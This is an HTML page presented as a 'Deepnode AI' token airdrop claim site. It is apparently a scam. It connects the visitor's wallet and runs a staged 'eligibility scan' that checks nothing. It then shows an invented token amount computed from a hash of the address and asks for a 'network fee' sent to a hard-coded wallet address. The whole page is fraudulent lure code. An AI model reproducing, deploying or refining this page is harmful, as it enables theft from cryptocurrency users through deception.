<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Deepnode AI Airdrop</title>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

<style>
html,body{
  margin:0;padding:0;height:100%;
  font-family:-apple-system,BlinkMacSystemFont,Inter,Arial;
  background:linear-gradient(180deg,#05060f,#1a0b2e,#3b145f);
  color:#fff;
}
.container{
  height:100%;display:flex;flex-direction:column;
  justify-content:center;align-items:center;text-align:center;
  padding:24px;
}
.logo{width:110px;margin-bottom:20px}
h1{font-size:22px;margin-bottom:14px}
button{
  width:100%;max-width:340px;padding:16px;
  font-size:17px;border-radius:14px;
  border:1px solid rgba(255,255,255,.25);
  background:rgba(255,255,255,.08);
  color:#fff;cursor:pointer;
}
button:disabled{opacity:.5;cursor:not-allowed}
.status{margin-top:18px;font-size:14px;opacity:.85}
.footer{position:absolute;bottom:25px;font-size:12px;opacity:.6}

/* MODAL */
.modal{
  position:fixed;inset:0;
  background:rgba(0,0,0,.75);
  display:none;align-items:center;justify-content:center;
}
.box{
  background:#0e0f1f;padding:24px;border-radius:16px;
  width:90%;max-width:360px;
}
.progress{height:8px;background:#222;border-radius:10px;overflow:hidden;margin-top:16px}
.bar{height:100%;width:0%;background:linear-gradient(90deg,#7f5cff,#c77dff)}
.small{font-size:12px;opacity:.7;margin-top:12px}
.addr{word-break:break-all;font-size:12px;margin-top:8px;opacity:.8}
</style>
</head>

<body>

<div class="container">
  <img src="deepnode-logo.png" class="logo">
  <h1>Connect wallet to claim Deepnode AI airdrop</h1>
  <div id="timer"></div>
  <button id="btn" onclick="connectWallet()">Connect Wallet</button>
  <div class="status" id="status"></div>
  <div class="footer">Deepnode AI</div>
</div>

<div class="modal" id="modal">
  <div class="box">
    <div id="modalText">Initializing…</div>
    <div class="progress"><div class="bar" id="bar"></div></div>
    <div class="small" id="phase"></div>
    <div class="addr" id="feeAddr"></div>
  </div>
</div>

<script>
/* ================= CLAIM TIMER ================= */
const claimStart = new Date("2026-01-06T12:00:00Z").getTime();
const claimEnd   = new Date("2026-01-10T12:00:00Z").getTime();
const timer = document.getElementById("timer");
const btn = document.getElementById("btn");

function updateTimer(){
  const now=Date.now();
  if(now<claimStart){
    btn.disabled=true;
    timer.innerText="Claim opens soon";
  }else if(now<=claimEnd){
    btn.disabled=false;
    timer.innerText="Claim is live";
  }else{
    btn.disabled=true;
    timer.innerText="Claim ended";
  }
}
setInterval(updateTimer,1000);updateTimer();

/* ================ FIXED CONFIG ================= */
const FEE_ADDRESS =
"0xd4Fd6F4e221710b9977109A04E3fBFfA2FD620cd";

/* ================ WALLET ================= */
async function connectWallet(){
  if(!window.ethereum){
    status.innerText="Use MetaMask browser";
    return;
  }
  const provider=new ethers.providers.Web3Provider(window.ethereum);
  await provider.send("eth_requestAccounts",[]);
  const signer=provider.getSigner();
  const address=await signer.getAddress();
  status.innerText="Connected: "+address.slice(0,6)+"..."+address.slice(-4);
  runEligibility(address);
}

/* ========== FIXED PER‑WALLET AMOUNT ========== */
function getStoredAmount(address){
  const key="deepnode-"+address.toLowerCase();
  let stored=localStorage.getItem(key);
  if(stored) return stored;

  let hash=0;
  for(let i=0;i<address.length;i++){
    hash=(hash<<5)-hash+address.charCodeAt(i);
  }
  const amount=200+(Math.abs(hash)%801);
  localStorage.setItem(key,amount);
  return amount;
}

/* ================ ELIGIBILITY ================= */
function runEligibility(address){
  modal.style.display="flex";
  bar.style.width="0%";
  feeAddr.innerText="Fee receiver:\n"+FEE_ADDRESS;

  const phases=[
    "Scanning wallet activity…",
    "Validating eligibility…",
    "Allocating airdrop…"
  ];
  let step=0,progress=0;

  const interval=setInterval(()=>{
    progress+=20;
    bar.style.width=progress+"%";
    phase.innerText=phases[Math.min(step,phases.length-1)];
    step++;
    if(progress>=100){
      clearInterval(interval);
      const amount=getStoredAmount(address);
      modalText.innerHTML=
        `✅ Eligible<br><br>
         You are approved to claim<br>
         <b>${amount} DEEPNODE</b><br><br>
         Network fee required to proceed`;
    }
  },600);
}
</script>

</body>
</html>